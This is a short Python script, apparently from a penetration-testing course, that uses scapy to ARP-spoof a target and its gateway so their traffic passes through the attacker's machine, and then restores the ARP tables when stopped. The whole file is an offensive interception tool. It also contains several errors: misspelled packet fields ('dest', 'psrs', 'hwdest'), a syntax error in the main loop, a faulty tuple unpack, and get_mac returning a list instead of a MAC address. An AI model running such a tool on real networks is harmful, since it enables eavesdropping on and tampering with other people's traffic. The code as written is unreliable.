#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dest='ff:ff:ff:ff:ff:ff')
    arp_request_boadcast = broadcast / arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_boadcast, timeout=1, verbose=False)[1]
    print(answered_list.summary())

    print('IP\t\t\t\tMAC Address\n............')
    answered_list[0][1].hwsrc
    client_list = []

    for element in answered_list:
        client_dict = {'ip': element[1].psrc, 'MAC': element[1].hwsrc}
        client_list.append(client_dict)
    return client_list
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrs= spoof_ip)# creating an ARP response which is accepted without sending an ARP request. op=2 for ARP response op=1 for ARP  request
    scapy.send(packet)

sent_packets_count = 0
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip, hwdest=destination_mac, psrs= source_ip, hwsrc= source_mac)# Differently from the the previous spoof function we are adding hwsrc to prevent it from copying the Kali's mac address
    scapy.send(packet, count=4, verbose=False)
target_ip = " "
gateway_ip = " "
try:
    while True:
        spoof()target_ip, gateway_ip#one packet for the victim
        spoof(gateway_ip, target_ip)#one packet for the router
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent " + str(sent_packets_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C .....Resetting ARP tables. Please wait!\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
